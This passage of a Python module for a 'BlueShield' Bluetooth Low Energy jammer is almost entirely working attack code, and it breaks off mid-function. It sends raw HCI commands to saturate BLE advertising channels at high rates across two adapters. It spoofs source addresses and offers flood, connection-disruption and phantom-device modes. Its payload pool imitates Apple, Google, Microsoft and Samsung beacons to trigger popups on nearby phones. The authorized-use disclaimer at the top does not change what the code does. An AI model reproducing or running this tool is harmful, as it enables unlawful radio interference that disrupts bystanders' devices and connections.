"""
BlueShield Bluetooth Jammer Module (Research Grade v2.0)

WARNING: Bluetooth jamming is regulated by the FCC (47 U.S.C. SS 333) and
equivalent agencies worldwide. Unauthorized use of this module may violate
federal law and carry severe criminal penalties. This module is intended
ONLY for:
  - Authorized penetration testing with written client consent
  - Academic/security research in RF-shielded or isolated environments
  - Defensive security testing under institutional review

Supports three HCI backends (auto-negotiated):
  1. Raw HCI + BT 5.0 Extended Advertising (fastest, ~4000+ pkt/s per adapter)
  2. Raw HCI + Legacy Advertising (fast, ~1000+ pkt/s)
  3. hcitool subprocess fallback (slow, works everywhere hcitool is available)

Requires: Linux with BlueZ >= 5.50, root privileges, BLE 4.0+ adapter.
          Extended adv requires BLE 5.0+ adapter (e.g., Realtek RTL8761BUV).
"""

import os
import subprocess
import struct
import time
import threading
from collections import deque
from datetime import datetime, timezone
from enum import Enum


# ---------------------------------------------------------------------------
# JamMode enum — all supported jamming strategies
# ---------------------------------------------------------------------------

class JamMode(Enum):
    REACTIVE = "reactive"                   # Jam when unknown device detected
    CONTINUOUS = "continuous"               # Continuous jamming on target channels
    TARGETED = "targeted"                   # Jam specific device address
    SWEEP = "sweep"                         # Sweep across all BLE channels
    FLOOD = "flood"                         # Maximum-rate advertising flood
    DEAUTH = "deauth"                       # Connection disruption via ADV_DIRECT_IND
    CONNECTION_DISRUPT = "connection_disrupt"  # Spoofed CONNECT_IND PDU injection
    PHANTOM_FLOOD = "phantom_flood"         # Max phantom device generation


# ---------------------------------------------------------------------------
# JamSession — tracks a single jamming session with __slots__
# ---------------------------------------------------------------------------

class JamSession:
    """Tracks a jamming session. Uses __slots__ for memory efficiency."""

    __slots__ = (
        'session_id', 'mode', 'channel', 'target', 'start_time',
        'end_time', 'packets_sent', 'is_active', '_start_mono',
        '_pps_ring', '_bytes_est', '_channel_dist',
    )

    def __init__(self, session_id: int = 0, mode: str = "", channel: int = 0,
                 target: str = "", start_time: str = "", end_time: str = "",
                 packets_sent: int = 0, is_active: bool = False):
        self.session_id = session_id
        self.mode = mode
        self.channel = channel
        self.target = target
        self.start_time = start_time
        self.end_time = end_time
        self.packets_sent = packets_sent
        self.is_active = is_active
        self._start_mono: float = time.monotonic()
        # Rolling ring buffer for packets-per-second calculation (5-second window)
        self._pps_ring: deque = deque(maxlen=50)  # 100ms buckets over 5s
        self._bytes_est: int = 0
        self._channel_dist: dict = {37: 0, 38: 0, 39: 0}

    def record_packet(self, channel: int = 0, payload_len: int = 31):
        """Record a transmitted packet for metrics."""
        self.packets_sent += 1
        # HCI overhead (4) + adv header (2) + addr (6) + payload
        self._bytes_est += 4 + 2 + 6 + payload_len
        if channel in self._channel_dist:
            self._channel_dist[channel] += 1
        now = time.monotonic()
        self._pps_ring.append(now)

    def get_pps(self) -> float:
        """Rolling packets-per-second over the last 5 seconds."""
        if not self._pps_ring:
            return 0.0
        now = time.monotonic()
        cutoff = now - 5.0
        # Count packets in the last 5 seconds
        count = sum(1 for t in self._pps_ring if t >= cutoff)
        window = min(now - self._start_mono, 5.0)
        if window <= 0:
            return 0.0
        return count / window

    def elapsed_seconds(self) -> float:
        return time.monotonic() - self._start_mono


# ---------------------------------------------------------------------------
# RawHCISocket — direct HCI communication bypassing userspace tools
# ---------------------------------------------------------------------------

class RawHCISocket:
    """Raw HCI socket for fast direct-to-chip communication.

    Bypasses subprocess overhead by talking to the Bluetooth chip
    via the kernel's HCI socket interface. Supports both legacy and
    BT 5.0 Extended Advertising command sets.
    """

    def __init__(self, dev_id: int = 0):
        self.dev_id = dev_id
        self.sock = None
        self.supports_ext_adv: bool = False

    def open(self) -> bool:
        """Open raw HCI socket. Returns True on success."""
        try:
            import socket as _socket
            # AF_BLUETOOTH = 31, BTPROTO_HCI = 1
            self.sock = _socket.socket(31, _socket.SOCK_RAW, 1)
            self.sock.bind((self.dev_id,))
            self.sock.setblocking(False)
            return True
        except (OSError, PermissionError, AttributeError):
            return False

    def close(self):
        """Close the HCI socket."""
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_cmd(self, ogf: int, ocf: int, params: bytes = b'') -> bool:
        """Send an HCI command directly to the Bluetooth chip.

        Constructs the HCI command packet (type 0x01) with the given OGF/OCF
        opcode and parameter bytes, then writes it to the raw socket.
        """
        if not self.sock:
            return False
        try:
            opcode = (ogf << 10) | ocf
            # HCI command packet: type(0x01) + opcode(2B LE) + param_len(1B) + params
            pkt = struct.pack('<BHB', 0x01, opcode, len(params)) + params
            self.sock.send(pkt)
            return True
        except (OSError, BrokenPipeError):
            return False

    def send_cmds(self, cmds: list) -> int:
        """Send multiple HCI commands back-to-back without waiting for responses.

        Pipelining eliminates the inter-command round-trip time. Instead of
        stop_adv (2ms) -> set_params (2ms) -> set_data (2ms) -> start_adv (2ms)
        = ~8ms total, we send all four in a single burst for ~0.5ms total.

        Args:
            cmds: list of (ogf, ocf, params) tuples.

        Returns:
            Number of commands successfully sent.
        """
        if not self.sock:
            return 0
        sent = 0
        buf = bytearray()
        for ogf, ocf, params in cmds:
            opcode = (ogf << 10) | ocf
            buf += struct.pack('<BHB', 0x01, opcode, len(params))
            buf += params
        try:
            self.sock.send(bytes(buf))
            sent = len(cmds)
        except (OSError, BrokenPipeError):
            pass
        return sent

    # ------------------------------------------------------------------
    # Legacy Advertising Commands (BLE 4.0+)
    # ------------------------------------------------------------------

    def le_set_adv_params(self, channel_map: int = 0x07, interval_min: int = 0x0020,
                          interval_max: int = 0x0020, adv_type: int = 0x03,
                          own_addr_type: int = 0x00, peer_addr_type: int = 0x00,
                          peer_addr: bytes = b'\x00' * 6):
        """HCI LE Set Advertising Parameters (OGF=0x08, OCF=0x0006).

        adv_type: 0x00=ADV_IND, 0x01=ADV_DIRECT_IND, 0x02=ADV_SCAN_IND,
                  0x03=ADV_NONCONN_IND
        channel_map: bit0=ch37, bit1=ch38, bit2=ch39
        """
        params = struct.pack('<HH', interval_min, interval_max)
        params += struct.pack('B', adv_type)
        params += struct.pack('B', own_addr_type)
        params += struct.pack('B', peer_addr_type)
        params += peer_addr[:6].ljust(6, b'\x00')
        params += struct.pack('B', channel_map)
        params += struct.pack('B', 0x00)  # filter policy: process all
        return self.send_cmd(0x08, 0x0006, params)

    def le_set_adv_data(self, data: bytes = None):
        """HCI LE Set Advertising Data (OGF=0x08, OCF=0x0008).

        Max 31 bytes of advertising data. Pads to 31 bytes with 0x00.
        """
        if data is None:
            data = b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27
        data = data[:31].ljust(31, b'\x00')
        params = struct.pack('B', len(data)) + data
        return self.send_cmd(0x08, 0x0008, params)

    def le_set_scan_rsp_data(self, data: bytes = None):
        """HCI LE Set Scan Response Data (OGF=0x08, OCF=0x0009).

        Scan response data is sent when a scanner issues SCAN_REQ after
        receiving our advertisement. Setting disruptive scan response data
        forces scanning devices to waste additional airtime on the
        SCAN_REQ -> SCAN_RSP exchange, effectively doubling disruption
        per advertising event.
        """
        if data is None:
            data = b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27
        data = data[:31].ljust(31, b'\x00')
        params = struct.pack('B', len(data)) + data
        return self.send_cmd(0x08, 0x0009, params)

    def le_set_adv_enable(self, enable: bool = True):
        """HCI LE Set Advertise Enable (OGF=0x08, OCF=0x000A)."""
        params = struct.pack('B', 0x01 if enable else 0x00)
        return self.send_cmd(0x08, 0x000A, params)

    def le_set_random_address(self, addr_bytes: bytes):
        """HCI LE Set Random Address (OGF=0x08, OCF=0x0005).

        Sets the random device address used for advertising when
        own_addr_type is 0x01 (random). Used for source address spoofing.
        """
        if len(addr_bytes) != 6:
            return False
        return self.send_cmd(0x08, 0x0005, addr_bytes)

    # ------------------------------------------------------------------
    # BT 5.0 Extended Advertising Commands
    # ------------------------------------------------------------------

    def le_set_ext_adv_params(self, adv_handle: int = 0x00,
                              interval_min: int = 0x00A0,
                              interval_max: int = 0x00A0,
                              channel_map: int = 0x07,
                              own_addr_type: int = 0x01,
                              peer_addr_type: int = 0x00,
                              peer_addr: bytes = b'\x00' * 6,
                              adv_type: int = 0x0010,
                              tx_power: int = 0x7F):
        """HCI LE Set Extended Advertising Parameters (OGF=0x08, OCF=0x0036).

        Extended advertising allows multiple advertising sets to run
        simultaneously. Each set has its own handle, interval, and payload.
        With 4 handles per adapter, we achieve 4x the packet rate.

        adv_type bitfield (Extended Adv Event Properties):
            0x0010 = Legacy, non-connectable, non-scannable undirected
            0x0012 = Legacy, scannable, non-connectable undirected
            0x0000 = Extended, non-connectable, non-scannable
        """
        params = struct.pack('B', adv_handle)
        # Event properties (2 bytes LE)
        params += struct.pack('<H', adv_type)
        # Primary adv interval min/max (3 bytes each, LE)
        params += struct.pack('<I', interval_min)[:3]
        params += struct.pack('<I', interval_max)[:3]
        params += struct.pack('B', channel_map)
        params += struct.pack('B', own_addr_type)
        params += struct.pack('B', peer_addr_type)
        params += peer_addr[:6].ljust(6, b'\x00')
        params += struct.pack('B', 0x00)  # filter policy
        params += struct.pack('b', tx_power)  # TX power (signed)
        params += struct.pack('B', 0x01)  # primary PHY (1M)
        params += struct.pack('B', 0x00)  # secondary adv max skip
        params += struct.pack('B', 0x01)  # secondary PHY (1M)
        params += struct.pack('B', 0x00)  # advertising SID
        params += struct.pack('B', 0x00)  # scan request notification disable
        return self.send_cmd(0x08, 0x0036, params)

    def le_set_ext_adv_data(self, adv_handle: int = 0x00, data: bytes = b''):
        """HCI LE Set Extended Advertising Data (OGF=0x08, OCF=0x0037).

        Supports up to 251 bytes of advertising data (vs 31 for legacy).
        For jamming we keep payloads at 31 bytes for backward compatibility.
        """
        data = data[:251]
        params = struct.pack('B', adv_handle)
        params += struct.pack('B', 0x03)  # operation: complete
        params += struct.pack('B', 0x01)  # fragment preference: no fragment
        params += struct.pack('B', len(data))
        params += data
        return self.send_cmd(0x08, 0x0037, params)

    def le_set_ext_scan_rsp_data(self, adv_handle: int = 0x00, data: bytes = b''):
        """HCI LE Set Extended Scan Response Data (OGF=0x08, OCF=0x0038)."""
        data = data[:251]
        params = struct.pack('B', adv_handle)
        params += struct.pack('B', 0x03)  # operation: complete
        params += struct.pack('B', 0x01)  # fragment preference
        params += struct.pack('B', len(data))
        params += data
        return self.send_cmd(0x08, 0x0038, params)

    def le_set_ext_adv_enable(self, enable: bool = True, sets: list = None):
        """HCI LE Set Extended Advertising Enable (OGF=0x08, OCF=0x0039).

        Args:
            enable: True to start, False to stop.
            sets: list of (adv_handle, duration, max_events) tuples.
                  duration=0 means continuous, max_events=0 means unlimited.
                  If None, enables/disables handle 0 with continuous settings.
        """
        if sets is None:
            sets = [(0x00, 0, 0)]
        params = struct.pack('B', 0x01 if enable else 0x00)
        params += struct.pack('B', len(sets))
        for handle, duration, max_events in sets:
            params += struct.pack('B', handle)
            params += struct.pack('<H', duration)
            params += struct.pack('B', max_events)
        return self.send_cmd(0x08, 0x0039, params)

    def probe_ext_adv(self) -> bool:
        """Probe whether the controller supports Extended Advertising.

        Sends LE Set Extended Advertising Parameters for handle 0.
        If the controller rejects it (Unknown HCI Command), we fall back
        to legacy advertising. This is non-destructive.
        """
        result = self.le_set_ext_adv_params(adv_handle=0x00)
        if result:
            # Disable it immediately so we start clean
            self.le_set_ext_adv_enable(enable=False, sets=[(0x00, 0, 0)])
            self.supports_ext_adv = True
        else:
            self.supports_ext_adv = False
        return self.supports_ext_adv


# ---------------------------------------------------------------------------
# BluetoothJammer — main jammer class
# ---------------------------------------------------------------------------

class BluetoothJammer:
    """BLE jammer using raw HCI sockets with Extended Advertising support.

    Implements multiple jamming strategies with automatic backend negotiation:
    1. BT 5.0+ Extended Advertising: 4 simultaneous adv sets per adapter
    2. Legacy Advertising: single adv set with minimum interval
    3. hcitool subprocess: fallback when raw sockets unavailable

    Modes:
    - continuous: Saturate a single advertising channel with noise
    - sweep: Rapid channel hopping across all 3 advertising channels
    - reactive: Burst jamming with scan windows (smart duty cycle)
    - targeted: Focused interference toward a specific device address
    - flood: Maximum-rate advertising flood with randomized payloads
    - deauth: Rapid ADV_DIRECT_IND to disrupt connections
    - connection_disrupt: Spoofed CONNECT_IND PDU injection
    - phantom_flood: Maximum phantom device generation to overwhelm scanners

    Supports dual-adapter parallel jamming when secondary_interface is set.
    Both adapters share the same stop event and session.
    """

    BLE_ADV_CHANNELS = [37, 38, 39]
    CHANNEL_MAP = {37: 0x01, 38: 0x02, 39: 0x04, "all": 0x07}

    # Number of Extended Advertising sets to run simultaneously per adapter
    EXT_ADV_SET_COUNT = 4

    # Minimum advertising interval to attempt (3.75ms = 0x0006, BLE spec floor)
    AGGRESSIVE_INTERVAL_MIN = 0x0006
    # Standard minimum (100ms = 0x00A0) as fallback if chip rejects aggressive
    STANDARD_INTERVAL_MIN = 0x00A0
    # Legacy minimum (20ms = 0x0020) for chips that reject sub-20ms
    LEGACY_INTERVAL_MIN = 0x0020

    # Pre-defined payload pool size
    PAYLOAD_POOL_SIZE = 256
    # Regenerate pool every N cycles
    PAYLOAD_POOL_REGEN_INTERVAL = 1000

    # Payload patterns -- research-grade BLE disruption payloads
    # Each pattern is designed to trigger specific device-side processing
    PAYLOAD_PATTERNS = [
        # --- Generic noise patterns ---
        b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27,                             # Max-length raw noise
        b'\x02\x01\x06\x1A\xFF\xFF\xFF' + b'\xAA' * 24,               # Fake discoverable flag + noise
        b'\x02\x01\x06\x11\x07' + b'\xDE\xAD' * 13,                   # Fake 128-bit service UUID
        b'\x02\x0A\x7F' + b'\xFF' * 28,                                # Max TX power + noise

        # --- Vendor-specific protocol triggers ---
        # Apple Nearby Action (triggers iPhone notification popup)
        b'\x02\x01\x06\x1A\xFF\x4C\x00\x10\x06\x19\x01\x00\x00\x00\x00',
        # Apple AirDrop spoofed beacon
        b'\x02\x01\x06\x1A\xFF\x4C\x00\x05\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        # Spoofed iBeacon (Apple proximity beacon UUID)
        b'\x02\x01\x06\x1A\xFF\x4C\x00\x02\x15',
        # Spoofed Apple manufacturer data
        b'\x1E\xFF\x4C\x00' + b'\xFF' * 27,
        # Google Fast Pair model ID (triggers Android popup)
        b'\x02\x01\x06\x07\xFF\xE0\x00\x10\x00\x01\x00',
        # Microsoft Swift Pair beacon
        b'\x02\x01\x06\x0B\xFF\x06\x00\x03\x00\x80\x00\x00\x00\x00\x00',
        # Spoofed Samsung manufacturer data
        b'\x1E\xFF\x75\x00' + b'\xFF' * 27,
        # Samsung SmartThings beacon
        b'\x02\x01\x06\x1A\xFF\x75\x00\x42\x09',
        # BLE Mesh provisioning beacon (triggers mesh devices)
        b'\x02\x01\x06\x15\xFF\x00\x00\x00\x03',
        # Max-size garbage with AD structure header
        b'\x1E\xFF',
    ]

    def __init__(self, config: dict):
        self.config = config
        self.interface = config.get("interface", "hci0")
        self.dev_id = self._parse_dev_id(self.interface)
        self.power = config.get("jam_power", -20)
        self.is_jamming = False
        self.sessions: list = []
        self.session_count = 0
        self._jam_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._raw_socket: RawHCISocket | None = None
        self._use_raw = False
        self._use_ext_adv = False
        self._jam_lock = threading.Lock()
        self._effective_interval = self.LEGACY_INTERVAL_MIN
        self._backend_type = "hcitool"

        # Pre-generated payload pool for hot-loop performance
        self._payload_pool: list = []
        self._payload_index: int = 0
        self._payload_cycle: int = 0
        self._scan_rsp_pool: list = []
        self._scan_rsp_index: int = 0

        # Dual-adapter support
        self._secondary_interface: str | None = None
        self._secondary_dev_id: int | None = None
        self._secondary_raw_socket: RawHCISocket | None = None
        self._secondary_use_raw = False
        self._secondary_use_ext_adv = False
        self._secondary_jam_thread: threading.Thread | None = None
        self._dual_adapter = False

        sec_iface = config.get("jammer_secondary_interface")
        if sec_iface and sec_iface != self.interface:
            self._secondary_interface = sec_iface
            self._secondary_dev_id = self._parse_dev_id(sec_iface)

        # Pre-generate payload pools at init
        self._regenerate_payload_pool()

    # ------------------------------------------------------------------
    # Payload pool management
    # ------------------------------------------------------------------

    def _regenerate_payload_pool(self):
        """Pre-generate a pool of randomized payloads for hot-loop use.

        Avoids per-cycle random.choice + mutation overhead. Each payload
        is built from a base pattern with random byte mutations for
        uniqueness (BLE stacks filter exact duplicate advertisements).
        """
        pool = []
        scan_pool = []
        num_patterns = len(self.PAYLOAD_PATTERNS)

        for i in range(self.PAYLOAD_POOL_SIZE):
            base = self.PAYLOAD_PATTERNS[i % num_patterns]
            # Build advertising payload with random suffix/mutations
            payload = bytearray(base)
            # Pad short patterns with random data to 31 bytes
            if len(payload) < 31:
                payload.extend(os.urandom(31 - len(payload)))
            else:
                payload = payload[:31]
            # Mutate 4 random positions for uniqueness
            rand_bytes = os.urandom(8)
            for j in range(4):
                pos = 4 + (rand_bytes[j] % max(1, len(payload) - 5))
                payload[pos] = rand_bytes[j + 4]
            pool.append(bytes(payload))

            # Build a different scan response payload
            scan_base = self.PAYLOAD_PATTERNS[(i + 7) % num_patterns]
            scan_payload = bytearray(scan_base)
            if len(scan_payload) < 31:
                scan_payload.extend(os.urandom(31 - len(scan_payload)))
            else:
                scan_payload = scan_payload[:31]
            sr_rand = os.urandom(8)
            for j in range(4):
                pos = 4 + (sr_rand[j] % max(1, len(scan_payload) - 5))
                scan_payload[pos] = sr_rand[j + 4]
            scan_pool.append(bytes(scan_payload))

        self._payload_pool = pool
        self._scan_rsp_pool = scan_pool
        self._payload_index = 0
        self._scan_rsp_index = 0
        self._payload_cycle = 0

    def _next_payload(self) -> bytes:
        """Get the next payload from the pre-generated pool.

        Uses a simple counter to rotate through the pool. Regenerates
        the entire pool every PAYLOAD_POOL_REGEN_INTERVAL cycles.
        """
        self._payload_cycle += 1
        if self._payload_cycle >= self.PAYLOAD_POOL_REGEN_INTERVAL:
            self._regenerate_payload_pool()

        payload = self._payload_pool[self._payload_index]
        self._payload_index = (self._payload_index + 1) % self.PAYLOAD_POOL_SIZE
        return payload

    def _next_scan_rsp(self) -> bytes:
        """Get the next scan response payload from the pre-generated pool."""
        payload = self._scan_rsp_pool[self._scan_rsp_index]
        self._scan_rsp_index = (self._scan_rsp_index + 1) % self.PAYLOAD_POOL_SIZE
        return payload

    def _get_random_payload(self) -> bytes:
        """Get a randomized payload (pool-backed, backward-compatible name)."""
        return self._next_payload()

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_dev_id(interface: str) -> int:
        """Extract device ID from interface name (e.g., 'hci0' -> 0)."""
        try:
            return int(interface.replace("hci", ""))
        except (ValueError, AttributeError):
            return 0

    @staticmethod
    def _random_addr() -> bytes:
        """Generate a random BLE static address (top 2 bits set)."""
        addr = bytearray(os.urandom(6))
        addr[5] = 0xC0 | (addr[5] & 0x3F)  # Set static address type bits
        return bytes(addr)

    @staticmethod
    def _parse_target_address(target: str) -> bytes | None:
        """Parse a BT address string into 6 bytes, or None on failure."""
        try:
            parts = target.replace("-", ":").split(":")
            if len(parts) == 6:
                return bytes(int(p, 16) for p in parts)
        except (ValueError, IndexError):
            pass
        return None

    def _hci_cmd(self, cmd: str, timeout: int = 5) -> str:
        """Execute an HCI command via subprocess (fallback backend)."""
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True, text=True, timeout=timeout
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            return ""

    # ------------------------------------------------------------------
    # Socket initialization and backend negotiation
    # ------------------------------------------------------------------

    def _try_raw_socket(self) -> bool:
        """Try to open a raw HCI socket. Returns True on success."""
        sock = RawHCISocket(self.dev_id)
        if sock.open():
            self._raw_socket = sock
            self._use_raw = True
            return True
        return False

    def _try_secondary_raw_socket(self) -> bool:
        """Try to open a raw HCI socket for the secondary adapter."""
        if self._secondary_dev_id is None:
            return False
        sock = RawHCISocket(self._secondary_dev_id)
        if sock.open():
            self._secondary_raw_socket = sock
            self._secondary_use_raw = True
            return True
        return False

    def _negotiate_backend(self):
        """Negotiate the fastest available backend for the primary adapter.

        Tries in order:
        1. Raw HCI + Extended Advertising (BT 5.0+)
        2. Raw HCI + Legacy Advertising
        3. hcitool subprocess

        Also probes aggressive advertising intervals and falls back
        to standard if the chip rejects them.
        """
        if not self._try_raw_socket():
            self._use_raw = False
            self._use_ext_adv = False
            self._backend_type = "hcitool"
            self._effective_interval = self.LEGACY_INTERVAL_MIN
            print("[BlueShield Jammer] Raw HCI socket unavailable, using hcitool fallback")
            return

        # Try Extended Advertising
        if self._raw_socket.probe_ext_adv():
            self._use_ext_adv = True
            self._backend_type = "raw_hci_ext_adv"
            print("[BlueShield Jammer] Using raw HCI + Extended Advertising (BT 5.0+)")
        else:
            self._use_ext_adv = False
            self._backend_type = "raw_hci_legacy"
            print("[BlueShield Jammer] Using raw HCI + Legacy Advertising")

        # Probe aggressive interval (3.75ms)
        if self._use_ext_adv:
            test_ok = self._raw_socket.le_set_ext_adv_params(
                adv_handle=0x00,
                interval_min=self.AGGRESSIVE_INTERVAL_MIN,
                interval_max=self.AGGRESSIVE_INTERVAL_MIN,
            )
            if test_ok:
                self._effective_interval = self.AGGRESSIVE_INTERVAL_MIN
                self._raw_socket.le_set_ext_adv_enable(
                    enable=False, sets=[(0x00, 0, 0)])
                print(f"[BlueShield Jammer] Aggressive interval accepted: "
                      f"{self.AGGRESSIVE_INTERVAL_MIN * 0.625:.2f}ms")
            else:
                self._effective_interval = self.STANDARD_INTERVAL_MIN
                print(f"[BlueShield Jammer] Using standard interval: "
                      f"{self.STANDARD_INTERVAL_MIN * 0.625:.2f}ms")
        else:
            # Legacy: try 0x0020 (20ms), the spec minimum for legacy
            self._effective_interval = self.LEGACY_INTERVAL_MIN

    def _negotiate_secondary_backend(self):
        """Negotiate backend for the secondary adapter."""
        if not self._try_secondary_raw_socket():
            self._secondary_use_raw = False
            self._secondary_use_ext_adv = False
            return

        if self._secondary_raw_socket.probe_ext_adv():
            self._secondary_use_ext_adv = True
            print(f"[BlueShield Jammer] Secondary {self._secondary_interface}: "
                  f"Extended Advertising")
        else:
            self._secondary_use_ext_adv = False
            print(f"[BlueShield Jammer] Secondary {self._secondary_interface}: "
                  f"Legacy Advertising")

    # ------------------------------------------------------------------
    # Primary adapter advertising helpers
    # ------------------------------------------------------------------

    def _set_adv_params(self, channel: int):
        """Set BLE advertising parameters for jamming (legacy)."""
        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_params(
                channel_map=ch_map,
                interval_min=self._effective_interval,
                interval_max=self._effective_interval,
            )
        else:
            ch_hex = f"{ch_map:02X}"
            iv = f"{self._effective_interval & 0xFF:02X} {(self._effective_interval >> 8) & 0xFF:02X}"
            self._hci_cmd(
                f"hcitool -i {self.interface} cmd 0x08 0x0006 "
                f"{iv} {iv} 03 00 00 00 00 00 00 00 00 {ch_hex} 00"
            )

    def _set_adv_data(self, data: bytes = None):
        """Set advertising data payload (legacy)."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_data(data)
        else:
            if data is None:
                data_str = "1F FF FF FF" + " FF" * 27
            else:
                data_str = " ".join(f"{b:02X}" for b in data[:31])
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x0008 {data_str}")

    def _set_scan_rsp_data(self, data: bytes = None):
        """Set scan response data (legacy). Doubles disruption per adv event."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_scan_rsp_data(data)
        else:
            if data is None:
                data_str = "1F FF FF FF" + " FF" * 27
            else:
                data_str = " ".join(f"{b:02X}" for b in data[:31])
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x0009 {data_str}")

    def _start_adv(self):
        """Enable BLE advertising (legacy)."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_enable(True)
        else:
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 01")

    def _stop_adv(self):
        """Disable BLE advertising (legacy)."""
        if self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_enable(False)
        else:
            self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 00")

    # ------------------------------------------------------------------
    # Extended Advertising multi-set helpers
    # ------------------------------------------------------------------

    def _setup_ext_adv_sets(self, channel_map: int = 0x07, count: int = 4,
                            own_addr_type: int = 0x01,
                            adv_type: int = 0x0010):
        """Configure multiple Extended Advertising sets.

        Each set gets its own handle (0..count-1), enabling simultaneous
        transmission. With 4 sets x 3.75ms interval we achieve ~1066 adv
        events/sec per adapter, vs ~266 with a single legacy set.
        """
        if not (self._use_ext_adv and self._raw_socket):
            return False
        for handle in range(count):
            self._raw_socket.le_set_ext_adv_params(
                adv_handle=handle,
                interval_min=self._effective_interval,
                interval_max=self._effective_interval,
                channel_map=channel_map,
                own_addr_type=own_addr_type,
                adv_type=adv_type,
            )
            self._raw_socket.le_set_ext_adv_data(
                adv_handle=handle, data=self._next_payload())
            self._raw_socket.le_set_ext_scan_rsp_data(
                adv_handle=handle, data=self._next_scan_rsp())
        return True

    def _enable_ext_adv_sets(self, enable: bool = True, count: int = 4):
        """Enable or disable all Extended Advertising sets."""
        if not (self._use_ext_adv and self._raw_socket):
            return False
        sets = [(h, 0, 0) for h in range(count)]  # duration=0, max_events=0
        return self._raw_socket.le_set_ext_adv_enable(enable=enable, sets=sets)

    def _rotate_ext_adv_sets(self, count: int = 4, channel: int = 0):
        """Rotate payloads across all Extended Advertising sets using pipelining.

        Builds all HCI commands into a single buffer and sends them as one
        burst, reducing cycle time from ~4ms to ~0.5ms.
        """
        if not (self._use_ext_adv and self._raw_socket):
            return 0

        cmds = []
        for handle in range(count):
            payload = self._next_payload()
            scan_rsp = self._next_scan_rsp()

            # Build ext adv data command params
            data_params = struct.pack('B', handle)
            data_params += struct.pack('B', 0x03)  # complete
            data_params += struct.pack('B', 0x01)  # no fragment
            data_params += struct.pack('B', len(payload))
            data_params += payload
            cmds.append((0x08, 0x0037, data_params))

            # Build ext scan response data command params
            sr_params = struct.pack('B', handle)
            sr_params += struct.pack('B', 0x03)
            sr_params += struct.pack('B', 0x01)
            sr_params += struct.pack('B', len(scan_rsp))
            sr_params += scan_rsp
            cmds.append((0x08, 0x0038, sr_params))

        return self._raw_socket.send_cmds(cmds)

    # ------------------------------------------------------------------
    # Secondary adapter advertising helpers
    # ------------------------------------------------------------------

    def _secondary_set_adv_params(self, channel: int):
        """Set BLE advertising parameters on the secondary adapter."""
        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
        if self._secondary_use_raw and self._secondary_raw_socket:
            self._secondary_raw_socket.le_set_adv_params(
                channel_map=ch_map,
                interval_min=self._effective_interval,
                interval_max=self._effective_interval,
            )
        else:
            ch_hex = f"{ch_map:02X}"
            self._hci_cmd(
                f"hcitool -i {self._secondary_interface} cmd 0x08 0x0006 "
                f"20 00 20 00 03 00 00 00 00 00 00 00 00 {ch_hex} 00"
            )

    def _secondary_set_adv_data(self, data: bytes = None):
        """Set advertising data payload on the secondary adapter."""
        if self._secondary_use_raw and self._secondary_raw_socket:
            self._secondary_raw_socket.le_set_adv_data(data)
        else:
            if data is None:
                data_str = "1F FF FF FF" + " FF" * 27
            else:
                data_str = " ".join(f"{b:02X}" for b in data[:31])
            self._hci_cmd(
                f"hcitool -i {self._secondary_interface} cmd 0x08 0x0008 {data_str}")

    def _secondary_set_scan_rsp_data(self, data: bytes = None):
        """Set scan response data on the secondary adapter."""
        if self._secondary_use_raw and self._secondary_raw_socket:
            self._secondary_raw_socket.le_set_scan_rsp_data(data)
        else:
            if data is None:
                data_str = "1F FF FF FF" + " FF" * 27
            else:
                data_str = " ".join(f"{b:02X}" for b in data[:31])
            self._hci_cmd(
                f"hcitool -i {self._secondary_interface} cmd 0x08 0x0009 {data_str}")

    def _secondary_start_adv(self):
        """Enable BLE advertising on the secondary adapter."""
        if self._secondary_use_raw and self._secondary_raw_socket:
            self._secondary_raw_socket.le_set_adv_enable(True)
        else:
            self._hci_cmd(
                f"hcitool -i {self._secondary_interface} cmd 0x08 0x000A 01")

    def _secondary_stop_adv(self):
        """Disable BLE advertising on the secondary adapter."""
        if self._secondary_use_raw and self._secondary_raw_socket:
            self._secondary_raw_socket.le_set_adv_enable(False)
        else:
            self._hci_cmd(
                f"hcitool -i {self._secondary_interface} cmd 0x08 0x000A 00")

    def _secondary_setup_ext_adv_sets(self, channel_map: int = 0x07, count: int = 4):
        """Configure Extended Advertising sets on the secondary adapter."""
        if not (self._secondary_use_ext_adv and self._secondary_raw_socket):
            return False
        for handle in range(count):
            self._secondary_raw_socket.le_set_ext_adv_params(
                adv_handle=handle,
                interval_min=self._effective_interval,
                interval_max=self._effective_interval,
                channel_map=channel_map,
                own_addr_type=0x01,
            )
            self._secondary_raw_socket.le_set_ext_adv_data(
                adv_handle=handle, data=self._next_payload())
            self._secondary_raw_socket.le_set_ext_scan_rsp_data(
                adv_handle=handle, data=self._next_scan_rsp())
        return True

    def _secondary_enable_ext_adv_sets(self, enable: bool = True, count: int = 4):
        """Enable/disable Extended Advertising sets on the secondary adapter."""
        if not (self._secondary_use_ext_adv and self._secondary_raw_socket):
            return False
        sets = [(h, 0, 0) for h in range(count)]
        return self._secondary_raw_socket.le_set_ext_adv_enable(
            enable=enable, sets=sets)

    def _secondary_rotate_ext_adv_sets(self, count: int = 4):
        """Rotate ext adv set payloads on the secondary adapter via pipelining."""
        if not (self._secondary_use_ext_adv and self._secondary_raw_socket):
            return 0
        cmds = []
        for handle in range(count):
            payload = self._next_payload()
            scan_rsp = self._next_scan_rsp()
            data_params = struct.pack('B', handle)
            data_params += struct.pack('B', 0x03)
            data_params += struct.pack('B', 0x01)
